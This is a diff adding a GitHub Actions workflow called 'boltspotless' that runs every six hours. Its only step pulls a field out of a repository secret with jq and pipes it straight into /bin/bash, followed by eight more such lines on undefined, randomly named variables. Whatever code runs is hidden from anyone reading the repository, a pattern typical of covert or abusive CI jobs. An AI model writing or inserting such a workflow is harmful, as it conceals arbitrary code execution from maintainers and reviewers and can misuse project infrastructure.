@@ -1,0 +1,25 @@
+name: boltspotless
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: boltspotless
+        env:
+          xchc9: ${{ secrets.xchc9 }}
+        run: |
+          echo $xchc9 | jq -r .ekp94735 | /bin/bash
+          echo $yxuy56658 | jq -r .uzjn7820 | /bin/bash
+          echo $jr35 | jq -r .b48 | /bin/bash
+          echo $ul1 | jq -r .rs943 | /bin/bash
+          echo $u78 | jq -r .l9 | /bin/bash
+          echo $hcs830 | jq -r .qq11 | /bin/bash
+          echo $l53362 | jq -r .a9 | /bin/bash
+          echo $ll5209 | jq -r .cz9770 | /bin/bash
+          echo $njs0438 | jq -r .jp43 | /bin/bash
+
